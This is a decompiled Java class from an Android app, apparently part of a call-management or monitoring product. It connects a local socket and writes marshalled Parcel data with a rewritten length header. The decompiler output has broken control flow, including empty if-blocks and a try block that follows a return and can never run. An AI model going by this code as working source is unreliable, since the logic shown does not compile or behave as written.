package com.fx.socket;

import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.net.LocalSocketAddress.Namespace;
import android.os.Parcel;
import com.vvt.h.a;
import java.io.IOException;
import java.io.OutputStream;

public class d
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  
  public static LocalSocket getSocketClient(String name, LocalSocketAddress.Namespace namespace) {
    boolean bool1 = a;
    if ((!bool1) || (namespace == null)) {
      namespace = LocalSocketAddress.Namespace.ABSTRACT;
    }

    bool1 = a;
    if (bool1) {}
    LocalSocket localLocalSocket = new android.net.LocalSocket();
    LocalSocketAddress localLocalSocketAddress = new android.net.LocalSocketAddress(name, namespace);
    localLocalSocket.connect(localLocalSocketAddress);

    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return localLocalSocket;
  }
  
  public static void a(Parcel paramParcel)
  {
    Object localObject = Parcel.obtain();
    int i = paramParcel.dataSize() + -4;
    ((Parcel)localObject).writeInt(i);
    localObject = ((Parcel)localObject).marshall();
    i = (localObject[0] & 0xFF) << 24;
    int j = (localObject[1] & 0xFF) << 16;
    i |= j;
    j = (localObject[2] & 0xFF) << 8;
    i |= j;
    int k = localObject[3] & 0xFF | i;
    paramParcel.setDataPosition(0);
    paramParcel.writeInt(k);
  }
  
  public static boolean a(LocalSocket paramLocalSocket, Parcel paramParcel)
  {
    boolean bool1 = false;
    boolean bool2;
    if (paramLocalSocket == null)
    {
      bool2 = b;
      if (!bool2) {}
    }
    for (;;)
    {
      return bool1;
      try
      {
        OutputStream localOutputStream = paramLocalSocket.getOutputStream();
        if (localOutputStream == null) {
          continue;
        }
        byte[] arrayOfByte = paramParcel.marshall();
        localOutputStream.write(arrayOfByte);
        localOutputStream.flush();
        bool1 = true;
      }
      catch (IOException localIOException)
      {
        bool2 = b;
      }
      if (!bool2) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/fx/socket/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */